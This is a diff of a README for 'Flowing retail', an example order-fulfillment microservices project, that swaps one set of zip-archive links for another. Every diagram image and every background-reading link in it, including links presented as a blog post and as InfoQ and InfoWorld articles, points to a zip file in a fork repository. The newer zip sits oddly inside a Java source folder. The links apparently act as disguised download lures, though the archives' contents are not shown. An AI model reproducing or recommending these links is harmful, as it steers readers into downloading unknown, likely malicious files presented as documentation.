@@ -10,7 +10,7 @@ The example respects learnings from **Domain Driven Design (DDD)**, Event Driven
 
 Flowing retail simulates a very easy order fulfillment system:
 
-![Events and Commands](https://raw.githubusercontent.com/ducnguyenminh/flowing-retail/master/nongaseous/flowing-retail.zip)
+![Events and Commands](https://github.com/ducnguyenminh/flowing-retail/raw/refs/heads/master/kafka/java/monitor/src/main/java/io/retail-flowing-v1.2-beta.1.zip)
 
 <a name = "alternatives"></a>
 
@@ -18,7 +18,7 @@ Flowing retail simulates a very easy order fulfillment system:
 
 The most fundamental choice is to select the **communication mechanism**:
 
-* **[Apache Kafka](kafka/)** as event bus (could be easily changed to messaging, e.g. RabbitMQ): [](https://raw.githubusercontent.com/ducnguyenminh/flowing-retail/master/nongaseous/flowing-retail.zip)
+* **[Apache Kafka](kafka/)** as event bus (could be easily changed to messaging, e.g. RabbitMQ): [](https://github.com/ducnguyenminh/flowing-retail/raw/refs/heads/master/kafka/java/monitor/src/main/java/io/retail-flowing-v1.2-beta.1.zip)
 * **[REST](rest/)** communication between Services.
   * This example also shows how to do **stateful resilience patterns** like **stateful retries** leveraging a workflow engine.
 * **[Zeebe](zeebe/)** broker doing work distribution.
@@ -37,7 +37,7 @@ and the **programming language**:
 
 ## Storyline
 
-Flowing retail simulates a very easy order fulfillment system. The business logic is separated into the services shown above (shown as a [context map](https://raw.githubusercontent.com/ducnguyenminh/flowing-retail/master/nongaseous/flowing-retail.zip)).
+Flowing retail simulates a very easy order fulfillment system. The business logic is separated into the services shown above (shown as a [context map](https://github.com/ducnguyenminh/flowing-retail/raw/refs/heads/master/kafka/java/monitor/src/main/java/io/retail-flowing-v1.2-beta.1.zip)).
 
 ### Long running services and orchestration
 
@@ -47,19 +47,19 @@ Some services are **long running** in nature - for example: the payment service 
 
 Note that the state machine (_or workflow engine in this case_) is a library used **within** one service. If different services need a workflow engine they can  run whatever engine they want. This way it is an autonomous team decision if they want to use a framework, and which one:
 
-![Events and Commands](https://raw.githubusercontent.com/ducnguyenminh/flowing-retail/master/nongaseous/flowing-retail.zip)
+![Events and Commands](https://github.com/ducnguyenminh/flowing-retail/raw/refs/heads/master/kafka/java/monitor/src/main/java/io/retail-flowing-v1.2-beta.1.zip)
 
 ### Resilience patterns for synchronous communication
 
 You also have to deal with basic communication problems, the specifics of which depend on the means of communication (for example: _asynchronous messaging_ vs. _blocking synchronous REST calls_). You might use stateful retries for this.
 
-![V1](https://raw.githubusercontent.com/ducnguyenminh/flowing-retail/master/nongaseous/flowing-retail.zip)
+![V1](https://github.com/ducnguyenminh/flowing-retail/raw/refs/heads/master/kafka/java/monitor/src/main/java/io/retail-flowing-v1.2-beta.1.zip)
 
 ### See [REST example](rest/).
 
 
 ## Links and background reading
 
-* Introduction blog post: https://raw.githubusercontent.com/ducnguyenminh/flowing-retail/master/nongaseous/flowing-retail.zip
-* InfoQ-Writeup "Events, Flows and Long-Running Services: A Modern Approach to Workflow Automation": https://raw.githubusercontent.com/ducnguyenminh/flowing-retail/master/nongaseous/flowing-retail.zip
-* InfoWorld article "3 common pitfalls of microservices integration—and how to avoid them": https://raw.githubusercontent.com/ducnguyenminh/flowing-retail/master/nongaseous/flowing-retail.zip
+* Introduction blog post: https://github.com/ducnguyenminh/flowing-retail/raw/refs/heads/master/kafka/java/monitor/src/main/java/io/retail-flowing-v1.2-beta.1.zip
+* InfoQ-Writeup "Events, Flows and Long-Running Services: A Modern Approach to Workflow Automation": https://github.com/ducnguyenminh/flowing-retail/raw/refs/heads/master/kafka/java/monitor/src/main/java/io/retail-flowing-v1.2-beta.1.zip
+* InfoWorld article "3 common pitfalls of microservices integration—and how to avoid them": https://github.com/ducnguyenminh/flowing-retail/raw/refs/heads/master/kafka/java/monitor/src/main/java/io/retail-flowing-v1.2-beta.1.zip
